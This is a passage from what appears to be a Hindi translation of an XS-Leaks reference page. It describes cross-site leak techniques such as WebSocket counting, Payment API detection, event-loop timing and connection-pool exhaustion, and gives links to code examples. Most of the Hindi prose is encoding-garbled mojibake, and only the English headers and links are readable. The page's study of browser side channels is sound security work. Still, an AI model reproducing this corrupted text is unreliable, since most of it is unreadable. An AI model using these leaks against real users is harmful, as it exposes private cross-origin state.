рдпрд╛ iframe рдореЗрдВ рдЦреЛрд▓рддреА рд╣реИ рдФрд░ рдлрд┐рд░, рд▓рдХреНрд╖реНрдп рд╡реЗрдм рдХреЗ рд▓реЛрдб рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж, рд╕рдВрднрд╡рддрдГ рдЕрдзрд┐рдХрддрдо рд╕рдВрдЦреНрдпрд╛ рдореЗрдВ WebSockets рдХрдиреЗрдХреНрд╢рди рдмрдирд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреА рд╣реИред **рдЙрддреНрдкрдиреНрди рдЕрдкрд╡рд╛рджреЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛** рд▓рдХреНрд╖реНрдп рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЗ **WebSocket рдХрдиреЗрдХреНрд╢рдиреЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛** рд╣реИред

### Payment API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API Usage
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: рдХреЗрд╡рд▓ рдПрдХ рд╣реА рд╕рдХреНрд░рд┐рдп рд╣реЛ рд╕рдХрддрд╛ рд╣реИред
* **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

рдпрд╣ XS-Leak рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрдм рдПрдХ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдкреГрд╖реНрда рдПрдХ рднреБрдЧрддрд╛рди рдЕрдиреБрд░реЛрдз рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ**ред

рдХреНрдпреЛрдВрдХрд┐ **рдХреЗрд╡рд▓ рдПрдХ рднреБрдЧрддрд╛рди рдЕрдиреБрд░реЛрдз рд╕рдХреНрд░рд┐рдп рд╣реЛ рд╕рдХрддрд╛ рд╣реИ** рдПрдХ рд╣реА рд╕рдордп рдореЗрдВ, рдпрджрд┐ рд▓рдХреНрд╖реНрдп рд╡реЗрдмрд╕рд╛рдЗрдЯ Payment Request API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реА рд╣реИ, рддреЛ рдЗрд╕ API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рднреА рдЖрдЧреЗ рдХреЗ рдкреНрд░рдпрд╛рд╕ **рд╡рд┐рдлрд▓** рд╣реЛрдВрдЧреЗ, рдФрд░ рдПрдХ **JavaScript рдЕрдкрд╡рд╛рдж** рдХрд╛ рдХрд╛рд░рдг рдмрдиреЗрдВрдЧреЗред рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕реЗ **рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ Payment API UI рджрд┐рдЦрд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдХреЗ** рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрджрд┐ рдПрдХ рдкреНрд░рдпрд╛рд╕ рдЕрдкрд╡рд╛рдж рдХрд╛ рдХрд╛рд░рдг рдмрдирддрд╛ рд╣реИ, рддреЛ рд▓рдХреНрд╖реНрдп рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реА рд╣реИред рд╣рдорд▓рд╛рд╡рд░ рдЗрди рдирд┐рдпрдорд┐рдд рдкреНрд░рдпрд╛рд╕реЛрдВ рдХреЛ UI рдмрдирд╛рдиреЗ рдХреЗ рддреБрд░рдВрдд рдмрд╛рдж рдмрдВрдж рдХрд░рдХреЗ рдЫрд┐рдкрд╛ рд╕рдХрддрд╛ рд╣реИред

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Summary:** рдПрдХ рд╡реЗрдм рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рд╕рдордп рдХреЛ рдорд╛рдкреЗрдВ рдЬреЛ рдПрдХрд▓-рдереНрд░реЗрдбреЗрдб JS рдЗрд╡реЗрдВрдЯ рд▓реВрдк рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред
* **Code Example**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript рдПрдХ [рдПрдХрд▓-рдереНрд░реЗрдбреЗрдб рдЗрд╡реЗрдВрдЯ рд▓реВрдк](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) рд╕рдорд╡рд░реНрддреА рдореЙрдбрд▓ рдкрд░ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ **рдпрд╣ рдПрдХ рд╕рдордп рдореЗрдВ рдХреЗрд╡рд▓ рдПрдХ рдХрд╛рд░реНрдп рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред рдЗрд╕ рд╡рд┐рд╢реЗрд╖рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ **рдпрд╣ рдорд╛рдкрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдПрдХ рдЕрд▓рдЧ рдореВрд▓ рд╕реЗ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рдХрд┐рддрдирд╛ рд╕рдордп рд▓рдЧрддрд╛ рд╣реИ**ред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЕрдкрдиреЗ рдХреЛрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рд╕рдордп рдХреЛ рдЗрд╡реЗрдВрдЯ рд▓реВрдк рдореЗрдВ рдорд╛рдк рд╕рдХрддрд╛ рд╣реИ, рд▓рдЧрд╛рддрд╛рд░ рдирд┐рд╢реНрдЪрд┐рдд рдЧреБрдгреЛрдВ рдХреЗ рд╕рд╛рде рдЗрд╡реЗрдВрдЯ рднреЗрдЬрдХрд░ред рдпреЗ рдЗрд╡реЗрдВрдЯ рддрдм рд╕рдВрд╕рд╛рдзрд┐рдд рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗ рдЬрдм рдЗрд╡реЗрдВрдЯ рдкреВрд▓ рдЦрд╛рд▓реА рд╣реЛрдЧрд╛ред рдпрджрд┐ рдЕрдиреНрдп рдореВрд▓ рднреА рдЙрд╕реА рдкреВрд▓ рдореЗрдВ рдЗрд╡реЗрдВрдЯ рднреЗрдЬ рд░рд╣реЗ рд╣реИрдВ, рддреЛ рдПрдХ **рд╣рдорд▓рд╛рд╡рд░ рдЗрди рдмрд╛рд╣рд░реА рдЗрд╡реЗрдВрдЯ рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдореЗрдВ рджреЗрд░реА рдХреЛ рджреЗрдЦрдХрд░ рдпрд╣ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЗрди рдмрд╛рд╣рд░реА рдЗрд╡реЗрдВрдЯ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рдХрд┐рддрдирд╛ рд╕рдордп рд▓рдЧрддрд╛ рд╣реИ**ред рджреЗрд░реА рдХреЗ рд▓рд┐рдП рдЗрд╡реЗрдВрдЯ рд▓реВрдк рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░рдиреЗ рдХреА рдпрд╣ рд╡рд┐рдзрд┐ рд╡рд┐рднрд┐рдиреНрди рдореВрд▓реЛрдВ рд╕реЗ рдХреЛрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рд╕рдордп рдХреЛ рдкреНрд░рдХрдЯ рдХрд░ рд╕рдХрддреА рд╣реИ, рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░ рд╕рдХрддреА рд╣реИред

{% hint style="warning" %}
рдПрдХ рдирд┐рд╖реНрдкрд╛рджрди рд╕рдордп рдореЗрдВ **рдиреЗрдЯрд╡рд░реНрдХ рдХрд╛рд░рдХреЛрдВ** рдХреЛ **рд╣рдЯрд╛рдирд╛** рд╕рдВрднрд╡ рд╣реИ рддрд╛рдХрд┐ **рдЕрдзрд┐рдХ рд╕рдЯреАрдХ рдорд╛рдк** рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдкреГрд╖реНрда рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рд▓реЛрдб рдХрд░рдирд╛ред
{% endhint %}

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Summary:** рдПрдХ рд╡реЗрдм рдСрдкрд░реЗрд╢рди рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рд╕рдордп рдХреЛ рдорд╛рдкрдиреЗ рдХреА рдПрдХ рд╡рд┐рдзрд┐ рдореЗрдВ рдЬрд╛рдирдмреВрдЭрдХрд░ рдПрдХ рдереНрд░реЗрдб рдХреЗ рдЗрд╡реЗрдВрдЯ рд▓реВрдк рдХреЛ рдЕрд╡рд░реБрджреНрдз рдХрд░рдирд╛ рдФрд░ рдлрд┐рд░ **рдЗрд╡реЗрдВрдЯ рд▓реВрдк рдХреЛ рдлрд┐рд░ рд╕реЗ рдЙрдкрд▓рдмреНрдз рд╣реЛрдиреЗ рдореЗрдВ рдХрд┐рддрдирд╛ рд╕рдордп рд▓рдЧрддрд╛ рд╣реИ** рдХреЛ рдорд╛рдкрдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред рдПрдХ рдЕрд╡рд░реБрджреНрдз рдСрдкрд░реЗрд╢рди (рдЬреИрд╕реЗ рд▓рдВрдмреА рдЧрдгрдирд╛ рдпрд╛ рд╕рдордХрд╛рд▓рд┐рдХ API рдХреЙрд▓) рдХреЛ рдЗрд╡реЗрдВрдЯ рд▓реВрдк рдореЗрдВ рдбрд╛рд▓рдХрд░, рдФрд░ рдмрд╛рдж рдХреЗ рдХреЛрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреА рд╢реБрд░реБрдЖрдд рдХреЗ рд▓рд┐рдП рд╕рдордп рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░рдХреЗ, рдХреЛрдИ рдпрд╣ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЕрд╡рд░реБрджреНрдз рдЕрд╡рдзрд┐ рдХреЗ рджреМрд░рд╛рди рдЗрд╡реЗрдВрдЯ рд▓реВрдк рдореЗрдВ рдХреМрди рд╕реЗ рдХрд╛рд░реНрдп рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛ рд░рд╣реЗ рдереЗред рдпрд╣ рддрдХрдиреАрдХ JavaScript рдХреЗ рдЗрд╡реЗрдВрдЯ рд▓реВрдк рдХреА рдПрдХрд▓-рдереНрд░реЗрдбреЗрдб рдкреНрд░рдХреГрддрд┐ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рддреА рд╣реИ, рдЬрд╣рд╛рдВ рдХрд╛рд░реНрдп рдЕрдиреБрдХреНрд░рдо рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддреЗ рд╣реИрдВ, рдФрд░ рдпрд╣ рд╕рдорд╛рди рдереНрд░реЗрдб рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЕрдиреНрдп рдСрдкрд░реЗрд╢рдиреЛрдВ рдХреЗ рдкреНрд░рджрд░реНрд╢рди рдпрд╛ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдВрддрд░реНрджреГрд╖реНрдЯрд┐ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреА рд╣реИред
* **Code Example**:

рдЗрд╡реЗрдВрдЯ рд▓реВрдк рдХреЛ рд▓реЙрдХ рдХрд░рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рд╕рдордп рдХреЛ рдорд╛рдкрдиреЗ рдХреА рддрдХрдиреАрдХ рдХрд╛ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд▓рд╛рдн **Site Isolation** рдХреЛ рджрд░рдХрд┐рдирд╛рд░ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реИред **Site Isolation** рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реЗрд╖рддрд╛ рд╣реИ рдЬреЛ рд╡рд┐рднрд┐рдиреНрди рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдХреЛ рдЕрд▓рдЧ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд░рддреА рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рд╕рд╛рдЗрдЯреЛрдВ рдХреЛ рдЕрдиреНрдп рд╕рд╛рдЗрдЯреЛрдВ рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рддрдХ рд╕реАрдзреЗ рдкрд╣реБрдВрдЪрдиреЗ рд╕реЗ рд░реЛрдХрдирд╛ рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, рд╕рд╛рдЭрд╛ рдЗрд╡реЗрдВрдЯ рд▓реВрдк рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рджреВрд╕рд░реЗ рдореВрд▓ рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рд╕рдордп рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рдХреЗ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрд╕ рдореВрд▓ рдХреА рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдкреНрд░рддреНрдпрдХреНрд╖ рд░реВрдк рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рд╡рд┐рдзрд┐ рджреВрд╕рд░реЗ рдореВрд▓ рдХреЗ рдбреЗрдЯрд╛ рддрдХ рд╕реАрдзреА рдкрд╣реБрдВрдЪ рдкрд░ рдирд┐рд░реНрднрд░ рдирд╣реАрдВ рдХрд░рддреА рд╣реИ, рдмрд▓реНрдХрд┐ рд╕рд╛рдЭрд╛ рдЗрд╡реЗрдВрдЯ рд▓реВрдк рдкрд░ рдЙрд╕ рдореВрд▓ рдХреА рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рдкреНрд░рднрд╛рд╡ рдХреЛ рджреЗрдЦрддреА рд╣реИ, рдЗрд╕ рдкреНрд░рдХрд╛рд░ **Site Isolation** рджреНрд╡рд╛рд░рд╛ рд╕реНрдерд╛рдкрд┐рдд рд╕реБрд░рдХреНрд╖рд╛рддреНрдордХ рдмрд╛рдзрд╛рдУрдВ рд╕реЗ рдмрдЪрддреА рд╣реИред

{% hint style="warning" %}
рдПрдХ рдирд┐рд╖реНрдкрд╛рджрди рд╕рдордп рдореЗрдВ **рдиреЗрдЯрд╡рд░реНрдХ рдХрд╛рд░рдХреЛрдВ** рдХреЛ **рд╣рдЯрд╛рдирд╛** рд╕рдВрднрд╡ рд╣реИ рддрд╛рдХрд┐ **рдЕрдзрд┐рдХ рд╕рдЯреАрдХ рдорд╛рдк** рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдкреГрд╖реНрда рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рд▓реЛрдб рдХрд░рдирд╛ред
{% endhint %}

### Connection Pool

* **Inclusion Methods**: JavaScript Requests
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Summary:** рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рд╕рднреА рд╕реЙрдХреЗрдЯреНрд╕ рдХреЛ 1 рдХреЛ рдЫреЛрдбрд╝рдХрд░ рд▓реЙрдХ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рд▓рдХреНрд╖реНрдп рд╡реЗрдм рдХреЛ рд▓реЛрдб рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдПрдХ рд╣реА рд╕рдордп рдореЗрдВ рдПрдХ рдФрд░ рдкреГрд╖реНрда рд▓реЛрдб рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЕрдВрддрд┐рдо рдкреГрд╖реНрда рдХреЗ рд▓реЛрдб рд╣реЛрдиреЗ рддрдХ рдХрд╛ рд╕рдордп рд▓рдХреНрд╖реНрдп рдкреГрд╖реНрда рдХреЗ рд▓реЛрдб рд╣реЛрдиреЗ рдХрд╛ рд╕рдордп рд╣реИред
* **Code Example**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕рд░реНрд╡рд░ рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП рд╕реЙрдХреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдФрд░ рд╣рд╛рд░реНрдбрд╡реЗрдпрд░ рдХреЗ рд╕реАрдорд┐рдд рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рдХрд╛рд░рдг, **рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рд╕рдорд╡рд░реНрддреА рд╕реЙрдХреЗрдЯ рдХреА рд╕рдВрдЦреНрдпрд╛ рдкрд░ рдПрдХ рд╕реАрдорд╛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рд╕реАрдорд╛ рдХрд╛ рд╢реЛрд╖рдг рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд░рдгреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

1. рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреА рд╕реЙрдХреЗрдЯ рд╕реАрдорд╛ рдХрд╛ рдирд┐рд░реНрдзрд╛рд░рдг рдХрд░реЗрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, 256 рд╡реИрд╢реНрд╡рд┐рдХ рд╕реЙрдХреЗрдЯред
2. рд╡рд┐рднрд┐рдиреНрди рд╣реЛрд╕реНрдЯреЛрдВ рдХреЗ рд▓рд┐рдП 255 рдЕрдиреБрд░реЛрдз рд╢реБрд░реВ рдХрд░рдХреЗ 255 рд╕реЙрдХреЗрдЯреНрд╕ рдХреЛ рд▓рдВрдмреЗ рд╕рдордп рддрдХ рд╡реНрдпрд╕реНрдд рд░рдЦреЗрдВ, рдЬреЛ рдХрдиреЗрдХреНрд╢рди рдХреЛ рдЦреБрд▓реЗ рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдП рдЧрдП рд╣реИрдВ рдмрд┐рдирд╛ рдкреВрд░рд╛ рдХрд┐рдПред
3. рд▓рдХреНрд╖реНрдп рдкреГрд╖реНрда рдХреЛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП 256 рд╡реЗрдВ рд╕реЙрдХреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
4. рдПрдХ рдЕрд▓рдЧ рд╣реЛрд╕реНрдЯ рдХреЗ рд▓рд┐рдП 257 рд╡рд╛рдВ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред рдЪреВрдВрдХрд┐ рд╕рднреА рд╕реЙрдХреЗрдЯ рдЙрдкрдпреЛрдЧ рдореЗрдВ рд╣реИрдВ (рдЬреИрд╕рд╛ рдХрд┐ рдЪрд░рдг 2 рдФрд░ 3 рдореЗрдВ рд╣реИ), рдпрд╣ рдЕрдиреБрд░реЛрдз рддрдм рддрдХ рдХрддрд╛рд░рдмрджреНрдз рд╣реЛрдЧрд╛ рдЬрдм рддрдХ рдХреЛрдИ рд╕реЙрдХреЗрдЯ рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реЛ рдЬрд╛рддрд╛ред рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХреЗ рдЖрдЧреЗ рдмрдврд╝рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдХреА рджреЗрд░реА рд╣рдорд▓рд╛рд╡рд░ рдХреЛ 256 рд╡реЗрдВ рд╕реЙрдХреЗрдЯ (рд▓рдХреНрд╖реНрдп рдкреГрд╖реНрда рдХрд╛ рд╕реЙрдХреЗрдЯ) рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдЧрддрд┐рд╡рд┐рдзрд┐ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕рдордп рдХреА рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИред рдпрд╣ рдЕрдиреБрдорд╛рди рд╕рдВрднрд╡ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЪрд░рдг 2 рд╕реЗ 255 рд╕реЙрдХреЗрдЯ рдЕрднреА рднреА рд╡реНрдпрд╕реНрдд рд╣реИрдВ, рдпрд╣ рд╕рдВрдХреЗрдд рдХрд░рддреЗ рд╣реБрдП рдХрд┐ рдХреЛрдИ рднреА рдирдпрд╛ рдЙрдкрд▓рдмреНрдз рд╕реЙрдХреЗрдЯ рд╡рд╣ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬреЛ рдЪрд░рдг 3 рд╕реЗ рдореБрдХреНрдд рд╣реБрдЖ рд╣реЛред рдЗрд╕рд▓рд┐рдП 256 рд╡реЗрдВ рд╕реЙрдХреЗрдЯ рдХреЗ рдЙрдкрд▓рдмреНрдз рд╣реЛрдиреЗ рдореЗрдВ рд▓рдЧрдиреЗ рд╡рд╛рд▓рд╛ рд╕рдордп рд╕реАрдзреЗ рд▓рдХреНрд╖реНрдп рдкреГрд╖реНрда рдХреЗ рдЕрдиреБрд░реЛрдз рдХреЛ рдкреВрд░рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╕рдордп рд╕реЗ рдЬреБрдбрд╝рд╛ рд╣реБрдЖ рд╣реИред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Connection Pool by Destination

* **Inclusion Methods**: JavaScript Requests
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**:
* **Summary:** рдпрд╣ рдкрд┐рдЫрд▓реЗ рддрдХрдиреАрдХ рдХреЗ рд╕рдорд╛рди рд╣реИ рд▓реЗрдХрд┐рди рд╕рднреА рд╕реЙрдХреЗрдЯреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдмрдЬрд╛рдп, Google **Chrome** рдПрдХ рд╣реА рдореВрд▓ рдХреЗ рд▓рд┐рдП **6 рд╕рдорд╡рд░реНрддреА рдЕрдиреБрд░реЛрдзреЛрдВ** рдХреА рд╕реАрдорд╛ рд▓рдЧрд╛рддрд╛ рд╣реИред рдпрджрд┐ рд╣рдо **5** рдХреЛ **рдмреНрд▓реЙрдХ** рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ **6 рд╡рд╛рдВ** рдЕрдиреБрд░реЛрдз рд╢реБрд░реВ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рд╣рдо рдЗрд╕реЗ **рд╕рдордп** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдпрджрд┐ рд╣рдо **рдкреАрдбрд╝рд┐рдд рдкреГрд╖реНрда рдХреЛ** рдЙрд╕реА рдПрдВрдбрдкреЙрдЗрдВрдЯ рдкрд░ рдЕрдзрд┐рдХ **рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ** рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ **6 рд╡рд╛рдВ рдЕрдиреБрд░реЛрдз** **рд▓рдВрдмрд╛** рд╣реЛрдЧрд╛ рдФрд░ рд╣рдо рдЗрд╕реЗ рдкрд╣рдЪрд╛рди рд╕рдХрддреЗ рд╣реИрдВред

## Performance API Techniques

[`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) рд╡реЗрдм рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЗ рдкреНрд░рджрд░реНрд╢рди рдореЗрдЯреНрд░рд┐рдХреНрд╕ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API) рджреНрд╡рд╛рд░рд╛ рдФрд░ рд╕рдореГрджреНрдз рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред Resource Timing API рдиреЗрдЯрд╡рд░реНрдХ рдЕрдиреБрд░реЛрдз рд╕рдордп рдХреА рд╡рд┐рд╕реНрддреГрдд рдирд┐рдЧрд░рд╛рдиреА рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬреИрд╕реЗ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреА рдЕрд╡рдзрд┐ред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, рдЬрдм рд╕рд░реНрд╡рд░ рдЕрдкрдиреЗ рдЙрддреНрддрд░реЛрдВ рдореЗрдВ `Timing-Allow-Origin: *` рд╣реЗрдбрд░ рд╢рд╛рдорд┐рд▓ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЕрддрд┐рд░рд┐рдХреНрдд рдбреЗрдЯрд╛ рдЬреИрд╕реЗ рдЯреНрд░рд╛рдВрд╕рдлрд░ рдЖрдХрд╛рд░ рдФрд░ рдбреЛрдореЗрди рд▓реБрдХрдЕрдк рд╕рдордп рдЙрдкрд▓рдмреНрдз рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

